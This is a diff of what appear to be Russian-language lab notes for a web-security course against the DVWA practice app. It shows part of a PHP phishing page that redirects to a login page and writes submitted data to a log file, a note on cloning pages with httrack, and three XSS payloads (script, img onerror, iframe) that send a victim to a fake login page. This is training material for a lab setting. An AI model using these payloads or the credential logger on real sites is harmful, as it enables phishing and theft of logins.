@@ -83,7 +83,7 @@ fclose($handle);
 exit;
 ?>
 
-# копирование страниц kali tools: httrack
+# копирование страниц kali tools: httrack =============================================
 <?php
 header ('Location: http://192.168.0.103/dvwa/login.php');
 $handle = fopen("log.txt", "a");
@@ -97,3 +97,14 @@ fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>
+
+Осталось найти XSS и доставить payload, которым будет ссылка на фейковую страницу. 
+Какие возможны варианты? При срабатывании XSS жертву должно перенаправить на фейковую страницу, 
+а с учетом того, что payload не является скриптом, 
+нужно каким-то образом загрузить страницу, используя JS. Возможны следующие варианты
+так
+<script>document.location.href="http://192.168.56.103/lesson_4/fake_dvwa/192.168.56.102/dvwa/login.html"</script>
+или так
+<img src=1 onerror="javascript:window.location.replace('http://192.168.56.103/lesson_4/fake_dvwa/192.168.56.102/dvwa/login.html')">
+или так
+<iframe src="" width="100%" height="100%" frameborder = "no"/> 
